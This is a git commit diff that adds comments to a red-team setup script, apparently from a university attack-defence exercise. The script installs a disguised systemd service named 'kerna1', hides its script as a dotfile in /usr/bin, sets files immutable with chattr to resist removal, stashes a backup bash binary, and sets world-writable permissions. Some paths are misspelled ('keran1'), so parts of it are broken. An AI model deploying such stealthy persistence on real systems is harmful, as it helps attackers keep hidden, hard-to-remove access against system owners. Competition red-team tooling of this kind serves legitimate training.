6bae1a1f7a541dacc1f27e9ebf410849d1b840ed
0xalamri <hunter3@GOS-1330-02.main.ad.rit.edu>
2019-10-07 12:41:29 -0400

    adding commentes

--- Red/custom_service/setup.sh
+++ Red/custom_service/setup.sh
@@ -1,16 +1,23 @@
 #!/bin/bash
 
+#give all the permisson
 chmod 777 ./*
+
+#copy the systemd service to the right dir "Note: this requires root priv"
 cp ./kerna1.service /lib/systemd/system/kerna1.service
 
+#hide kerna1 script in /usr/bin
 cp ./kerna1.sh /usr/bin/.kerna1
 
+#make it immutable, so it can't be removed easily
 chattr +i /lib/systemd/system/keran1.service
 
+#make it immutable, so it can't be removed easily
 chattr +i /usr/bin/.keran1
 
+#copy bash binary, in case it gets deleted
 cp /usr/bin/bash /.bash
 
-
+#start and enable the service
 systemctl start kerna1
 systemctl enable kerna1
